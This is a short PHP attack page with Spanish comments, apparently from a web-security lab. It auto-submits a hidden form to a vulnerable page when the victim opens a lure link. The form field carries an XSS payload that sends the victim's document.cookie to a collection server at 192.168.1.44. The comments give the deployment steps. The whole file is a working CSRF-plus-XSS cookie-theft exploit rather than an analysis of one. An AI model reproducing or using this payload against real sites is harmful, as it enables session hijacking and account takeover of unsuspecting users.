<?php
# Formulario con el payload original a la sección de página vulnerable

# 1. El objetivo debe acceder a un enlace que le dirijirá a este servidor

# 2. Al acceder, directamente se enviará mediante javascript el post del formulario a la página vulnerable

# 3. Utilizar algún contenedor o servidor web ligero

$vulnweb = "localhost";

?>

<form action="<?php echo  $vulnweb ?>" method="post" id="formulario">
	<input type="hidden" name="clave" value=`<script>document.write("<img src='http://192.168.1.44/index.php?cookie=${encodeURI(document.cookie)}'>")</script>`;>
</form>
<script>
	window.onload = function() {
		document.getElementById("formulario").submit();
	};
</script>